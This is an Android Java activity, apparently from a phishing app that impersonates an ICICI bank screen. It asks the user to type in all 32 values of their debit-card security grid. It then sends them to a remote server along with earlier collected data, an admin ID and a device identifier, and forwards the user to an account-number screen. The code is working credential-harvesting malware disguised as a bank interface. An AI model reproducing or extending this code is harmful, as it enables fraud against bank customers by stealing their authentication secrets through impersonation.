package com.pegalite.neotron3.ui.icici;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.pegalite.neotron3.databinding.ActivityIcicidebitCardBinding;
import com.pegalite.neotron3.databinding.DebitCardAlphabetBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.ui.sb.SBWaitingActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class ICICIDebitCardActivity extends AppCompatActivity {

    ActivityIcicidebitCardBinding binding;
    String firstAlphabets = "ABCDEFGH", secondAlphabets = "IJKLMNOP";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityIcicidebitCardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        ViewCompat.setOnApplyWindowInsetsListener(binding.getRoot(), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        List<EditText> editTextList = new ArrayList<>();

        for (String alphabet : firstAlphabets.split("")) {
            DebitCardAlphabetBinding debitCardAlphabetBinding = DebitCardAlphabetBinding.inflate(getLayoutInflater(), binding.firstAlphabet, true);
            EditText editText = debitCardAlphabetBinding.getRoot();
            editText.setHint(alphabet);
            editTextList.add(editText);
        }

        for (String alphabet : secondAlphabets.split("")) {
            DebitCardAlphabetBinding debitCardAlphabetBinding = DebitCardAlphabetBinding.inflate(getLayoutInflater(), binding.secondAlphabet, true);
            EditText editText = debitCardAlphabetBinding.getRoot();
            editText.setHint(alphabet);
            editTextList.add(editText);
        }

        for (int i = 0; i < editTextList.size(); i++) {
            EditText current = editTextList.get(i);

            if (i < editTextList.size() - 1) {
                EditText next = editTextList.get(i + 1);

                current.addTextChangedListener(new TextWatcher() {
                    @Override
                    public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                    }

                    @Override
                    public void onTextChanged(CharSequence s, int start, int before, int count) {
                    }

                    @Override
                    public void afterTextChanged(Editable s) {
                        if (s.length() == 2) {
                            next.requestFocus();
                        }
                    }
                });

                current.setImeOptions(EditorInfo.IME_ACTION_NEXT);
                current.setOnEditorActionListener((v, actionId, event) -> {
                    if (actionId == EditorInfo.IME_ACTION_NEXT) {
                        next.requestFocus();
                        return true;
                    }
                    return false;
                });

            } else {
                current.setImeOptions(EditorInfo.IME_ACTION_DONE);
            }
        }
        binding.submit.setOnClickListener(view -> {
            JSONArray debitCard = new JSONArray();
            StringBuilder debitCardString = new StringBuilder();
            for (EditText editText : editTextList) {
                debitCard.put(editText.getText().toString());
                debitCardString.append(editText.getText().toString());
            }

            if (debitCardString.toString().length() != 32) {
                Toast.makeText(this, "Please Enter All the Fields!", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("cardGrid", debitCard);
                saveDetails(object);
                startActivity(new Intent(this, ICICIAccNumberActivity.class).putExtra("data", object.toString()));
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }

        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}